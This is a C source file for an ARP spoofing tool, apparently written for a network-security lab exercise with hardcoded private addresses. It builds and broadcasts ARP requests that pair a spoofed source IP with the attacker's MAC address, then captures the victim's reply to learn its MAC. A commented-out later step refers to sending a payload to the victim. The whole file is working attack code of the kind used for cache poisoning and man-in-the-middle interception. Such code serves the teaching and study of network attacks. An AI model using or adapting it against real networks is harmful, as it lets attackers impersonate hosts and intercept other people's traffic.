#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <netinet/ip.h>
#include <net/ethernet.h>

#include "packets.h"

# define BROADCAST_ADDR (uint8_t[6]){0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}

# define ERROR_SOCKET_CREATION          fprintf(stderr,"ERROR: Socket creation failed\n")
# define ERROR_GET_MAC                  fprintf(stderr,"ERROR: Could not get MAC address\n")
# define ERROR_PACKET_CREATION_ARP      fprintf(stderr,"ERROR: ARP packet creation failed\n")
# define ERROR_PACKET_CREATION_ETHER    fprintf(stderr,"ERROR: Ether frame creation failed\n")
# define ERROR_COULD_NOT_SEND           fprintf(stderr,"ERROR: Could not send\n")
# define ERROR_COULD_NOT_RECEIVE        fprintf(stderr,"ERROR: Could not receive\n")
# define ERROR_DISPLAY_USAGE            fprintf(stderr,"USAGE: %s source_ip target_ip interface\n")

# define PRINT_MAC_ADDRESS(X)   fprintf(stdout, \
                                        "MAC address: %02X:%02X:%02X:%02X:%02X:%02X\n", \
                                        X[0],               \
                                        X[1],               \
                                        X[2],               \
                                        X[3],               \
                                        X[4],               \
                                        X[5]);
# define PRINT_IP_ADDRESS(X)    fprintf(stdout, \
                                        "IP address: %02d.%02d.%02d.%02d\n", \
                                        X[0],               \
                                        X[1],               \
                                        X[2],               \
                                        X[3]);




// https://stackoverflow.com/a/1779758/11135136
// https://stackoverflow.com/a/1519596/11135136
unsigned char *get_my_mac_address(const int sock, const char interface[const])
{
    struct ifreq ifr;
    char buf[1024];
    int success = 0;

    strcpy(ifr.ifr_name, interface);
    ioctl(sock, SIOCGIFHWADDR, &ifr);

    unsigned char *mac = malloc(sizeof(unsigned char) * 6);
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);

    // printf("Attacker MAC : %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n",
    //        mac[0], mac[1], mac[2],
    //        mac[3], mac[4], mac[5]);

    return mac;
}

char get_index_from_interface(struct sockaddr_ll *device,
                              const char interface[const])
{
    if (device->sll_ifindex = if_nametoindex(interface)) {
        fprintf(stdout, "[+] Got index '%d' from interface '%s'\n",
                device->sll_ifindex, interface);
        return 1;
    }

    fprintf(stderr, "[-] Could not get index from '%s'\n", interface);
    return 0;
}

char broadcast_packet(const int sd,
                      struct sockaddr_ll *device,
                      const uint8_t *my_mac_address,
                      const char *spoofed_ip_source,
                      const char *victim_ip)
{
    eth_packet* eth_pkt;
    arp_packet* arp_pkt;

    if (!(arp_pkt = create_arp_packet(ARPOP_REQUEST, my_mac_address,
                                         spoofed_ip_source, BROADCAST_ADDR,
                                         victim_ip))) {
        ERROR_PACKET_CREATION_ARP;
        return 0;
    }
    fprintf(stdout, "[+] ARP packet created\n");

    if (!(eth_pkt =
              create_eth_packet(my_mac_address, BROADCAST_ADDR,
                                     arp_pkt))) {
        ERROR_PACKET_CREATION_ETHER;
        return 0;
    }
    fprintf(stdout, "[+] ETHER packet created\n");

    if ((sendto(sd, eth_pkt, ARP_HEADER_LENGTH + ETH_HEADER_LENGTH, 0,
                (const struct sockaddr *)device, sizeof(*device))) <= 0) {
        ERROR_COULD_NOT_SEND;
        return 0;
    }
    fprintf(stdout, "[+] Packet sent to broadcast\n");

    return 1;
}

uint8_t *get_victim_mac(const int sd, const char *victim_ip)
{
    char buffer[IP_MAXPACKET];
    eth_packet *eth_pkt;
    arp_packet *arp_pkt;
    uint8_t *victim_mac_address;
    char uint8_t_to_str[INET_ADDRSTRLEN] = {0};

    if (!(victim_mac_address = malloc(sizeof(uint8_t) * HARDWARE_LENGTH)))
        return (NULL);
    fprintf(stdout, "[*] Listening for target response..\n");
    while (1)
    {
        if (recvfrom(sd, buffer, IP_MAXPACKET, 0, NULL, NULL) <= 0)
            return (NULL);

        eth_pkt = (eth_packet *)buffer;
        if (ntohs(eth_pkt->eth_type) != ETH_P_ARP)
            continue;

        arp_pkt = (arp_packet *)(buffer + ETH_HEADER_LENGTH);

        if (ntohs(arp_pkt->opcode) != ARPOP_REPLY
            || (arp_pkt->sender_ip &&
                !inet_ntop(AF_INET, arp_pkt->sender_ip, uint8_t_to_str,
                           INET_ADDRSTRLEN))
            || strcmp(uint8_t_to_str, victim_ip))
        {
            memset(uint8_t_to_str, 0, INET_ADDRSTRLEN);
            continue;
        }
        fprintf(stdout, "[+] Got response from victim\n");
        fprintf(stdout, "[*] Sender mac address: ");
        PRINT_MAC_ADDRESS(arp_pkt->sender_mac);
        fprintf(stdout, "[*] Sender ip address: ");
        PRINT_IP_ADDRESS(arp_pkt->sender_ip);
        fprintf(stdout, "[*] Target mac address: ");
        PRINT_MAC_ADDRESS(arp_pkt->target_mac);
        fprintf(stdout, "[*] Target ip address: ");
        PRINT_IP_ADDRESS(arp_pkt->target_ip);

        memcpy(victim_mac_address, arp_pkt->sender_mac,
               HARDWARE_LENGTH * sizeof(uint8_t));
        fprintf(stdout, "[*] Victim's mac address: ");
        PRINT_MAC_ADDRESS(victim_mac_address);
        return (victim_mac_address);
    }
}

int main(int argc, char *argv[])
{

    // uint16_t var;
    // // memcpy(&var, (uint8_t[2]) {
    // //        ETH_P_ARP / 256, ETH_P_ARP % 256
    // // }, sizeof (uint8_t) * 2);
    // memcpy(&var, (uint8_t[2]) {
    //        htons(ETHERTYPE_ARP) & 0xff,
    //        htons(ETHERTYPE_ARP) >> 8
    //        }, sizeof(uint8_t)*2);
    // printf("0x%04x\n", var);
    // printf("0x%04x\n", htons(ETHERTYPE_ARP));
    // return 0;

    // if (argc != 4) {
    //     fprintf(stderr, ERROR_DISPLAY_USAGE, argv[0]);
    //     exit(EXIT_FAILURE);
    // }

    char *victim_ip, *spoofed_ip_source, *interface;
    unsigned char *atk_mac = NULL;
    unsigned char *victim_mac = NULL;
    int sock;
    struct sockaddr_ll device;


    // spoofed_ip_source = argv[1]; victim_ip = argv[2]; interface = argv[3];
    spoofed_ip_source = "10.9.0.5";
    victim_ip = "10.9.0.6";
    interface = "eth0";


    /** NOTE:
     *
     * extern int socket (int __domain, int __type, int __protocol) __THROW;
     *
     * htons() handles byte order of little endian machines. In big endian
     * machines it returns the value it is given.
     *
     * see `man 7 packet` for explanation for socket domain and socket type.
     *
     */

    // if ((sock = socket(AF_INET, SOCK_STREAM, 0 )) == -1) {
    if ((sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1) {
        ERROR_SOCKET_CREATION;
        return EXIT_FAILURE;
    }

    if (!(atk_mac = get_my_mac_address(sock, interface))) {
        ERROR_GET_MAC;
        return EXIT_FAILURE;
    }

    printf("Attacker MAC : %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n",
           atk_mac[0], atk_mac[1], atk_mac[2],
           atk_mac[3], atk_mac[4], atk_mac[5]);

    memset(&device, 0, sizeof device);
    if (!get_index_from_interface(&device, interface)) {
        exit(EXIT_FAILURE);
    }

    if (!broadcast_packet(sock, &device, atk_mac,
                          spoofed_ip_source, victim_ip)) {
        exit(EXIT_FAILURE);
    }
    victim_mac = get_victim_mac(sock, victim_ip);

    // return (!(get_index_from_interface(&device, interface)
    //           && broadcast_packet(sock, &device, atk_mac,
    //                                       spoofed_ip_source, victim_ip)
    //           && (victim_mac_address = get_victim_response(sock, victim_ip))
    //           && send_payload_to_victim(sock, &device,
    //                                     atk_mac, spoofed_ip_source,
    //                                     victim_mac_address, victim_ip))
    //         ? (EXIT_FAILURE)
    //         : (EXIT_SUCCESS));

    if (atk_mac != NULL) free(atk_mac);
    close(sock);


    return 0;
}
